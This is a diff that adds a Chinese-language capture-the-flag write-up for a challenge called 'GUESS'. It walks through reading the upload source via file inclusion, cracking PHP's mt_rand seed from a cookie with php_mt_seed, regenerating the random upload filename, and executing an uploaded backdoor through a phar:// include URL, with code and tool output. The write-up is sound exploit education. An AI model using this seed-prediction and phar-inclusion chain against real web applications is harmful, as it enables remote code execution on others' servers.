@@ -626,6 +626,188 @@ if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
 
 
 
+## GUESS
+
+访问题目界面
+
+![](https://qqx.im/mdimage/adword/guess_upload.png)
+
+提示
+
+> please upload an IMAGE file (gif|jpg|jpeg|png)
+
+尝试提交一个图片，地址变成了
+
+> /?page=upload
+
+试着包含文件读源码，可以得到index.php和upload.php
+
+```php
+<?php
+error_reporting(0);
+function show_error_message($message)
+{
+    die("<div class=\"msg error\" id=\"message\">
+    <i class=\"fa fa-exclamation-triangle\"></i>$message</div>");
+}
+
+function show_message($message)
+{
+    echo("<div class=\"msg success\" id=\"message\">
+    <i class=\"fa fa-exclamation-triangle\"></i>$message</div>");
+}
+
+function random_str($length = "32")
+{
+    $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
+        "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
+        "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
+        "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
+        "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+    $str = '';
+
+    for ($i = 1; $i <= $length; ++$i) {
+        $ch = mt_rand(0, count($set) - 1);
+        $str .= $set[$ch];
+    }
+
+    return $str;
+}
+
+session_start();
+
+
+
+$reg='/gif|jpg|jpeg|png/';
+if (isset($_POST['submit'])) {
+
+    $seed = rand(0,999999999);
+    mt_srand($seed);
+    $ss = mt_rand();
+    $hash = md5(session_id() . $ss);
+    setcookie('SESSI0N', $hash, time() + 3600);
+
+    if ($_FILES["file"]["error"] > 0) {
+        show_error_message("Upload ERROR. Return Code: " . $_FILES["file-upload-field"]["error"]);
+    }
+    $check2 = ((($_FILES["file-upload-field"]["type"] == "image/gif")
+            || ($_FILES["file-upload-field"]["type"] == "image/jpeg")
+            || ($_FILES["file-upload-field"]["type"] == "image/pjpeg")
+            || ($_FILES["file-upload-field"]["type"] == "image/png"))
+        && ($_FILES["file-upload-field"]["size"] < 204800));
+    $check3=!preg_match($reg,pathinfo($_FILES['file-upload-field']['name'], PATHINFO_EXTENSION));
+
+
+    if ($check3) show_error_message("Nope!");
+    if ($check2) {
+        $filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name'];
+        if (move_uploaded_file($_FILES['file-upload-field']['tmp_name'], $filename)) {
+            show_message("Upload successfully. File type:" . $_FILES["file-upload-field"]["type"]);
+        } else show_error_message("Something wrong with the upload...");
+    } else {
+        show_error_message("only allow gif/jpeg/png files smaller than 200kb!");
+    }
+}
+?>
+```
+
+看起来上传图片也没什么漏洞，但是结合文件包含漏洞就可以执行代码，这是2016SWPU一道题类似的思路。但是这里不太一样，这里上传的图片的文件名是随机的。但事实上，php的随机是可以破解的，用[cracker](https://www.openwall.com/php_mt_seed/)破解种子,用法看README。看代码，如果知道随机出来的第一个数->破解出种子->知道seed->重现文件名。
+
+但是第一个数又和一个奇怪的东西粘在一起
+
+```php
+$ss = mt_rand();
+$hash = md5(session_id() . $ss);
+setcookie('SESSI0N', $hash, time() + 3600);
+```
+
+这个session_id()是啥呢？就是我们提交过来的PHPSESSID=xxxxxx。如果为空就可以很容易的破解了。
+
+所以老步骤：制造一个后门hello.php->压缩成hello.zip->重命名成hello.png->空PHPSESSID上传图片获得SESSI0N->破解出seed->破解文件名
+
+实践过程中遇到的一个比较大的问题就是不知道服务器php版本，只能一个一个的试了
+
+![](https://qqx.im/mdimage/adword/guess_back.png)
+
+返回的
+
+> SESSI0N=3d097941ce294aebbcf61c4ab9ea5499
+
+去cmd5破解出第一个随机数
+
+> 429127491
+
+所以去crack出seed
+
+> (base) root@VM-0-11-ubuntu:~/php_mt_seed-4.0# ./php_mt_seed 429127491
+> Pattern: EXACT
+> Version: 3.0.7 to 5.2.0
+> Found 0, trying 0xfc000000 - 0xffffffff, speed 2692.9 Mseeds/s
+> Version: 5.2.1+
+> Found 0, trying 0x06000000 - 0x07ffffff, speed 15.6 Mseeds/s
+> seed = 0x07a89d59 = 128490841 (PHP 5.2.1 to 7.0.x; HHVM)
+> Found 1, trying 0x8c000000 - 0x8dffffff, speed 15.6 Mseeds/s 128490841
+> seed = 0x8c438db1 = 2353237425 (PHP 7.1.0+)
+> Found 2, trying 0xfe000000 - 0xffffffff, speed 15.6 Mseeds/s
+
+最后试出来的是PHP 5.2.1 to 7.0.x的128490841
+
+所以模拟源代码跑出文件名前缀
+
+```php
+<?php
+    $seed = "128490841";
+    mt_srand($seed);
+    $ss = mt_rand();
+    $session_id="";
+    $hash1 = md5($session_id. $ss);
+	// 这里的hash2只是为了验证最终得出的数是否是返回的SESSI0N
+    $hash2 = "3d097941ce294aebbcf61c4ab9ea5499";
+    if($hash1===$hash2){
+        echo './uP1O4Ds/' . random_str() . '_';
+    }
+    else {
+        echo "";
+    }
+
+
+    function random_str($length = "32")
+    {
+        $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
+            "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
+            "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
+            "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
+            "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
+        $str = '';
+
+        for ($i = 1; $i <= $length; ++$i) {
+            $ch = mt_rand(0, count($set) - 1);
+            $str .= $set[$ch];
+        }
+
+        return $str;
+    }
+
+```
+
+跑出的是
+
+```
+./uP1O4Ds/BfRZNJmJR2B8Zyz5XSWH6V9Xv3cb2g9T_
+```
+
+所以访问
+
+> ?page=phar://uP1O4Ds/BfRZNJmJR2B8Zyz5XSWH6V9Xv3cb2g9T_hello.png/hello
+
+就可以运行代码了
+
+所以PHP的随机数要是知道某些特定的条件的时候，就可以破解出seed了。
+
+
+
+
+
 \>\>**To be continue**
 
 
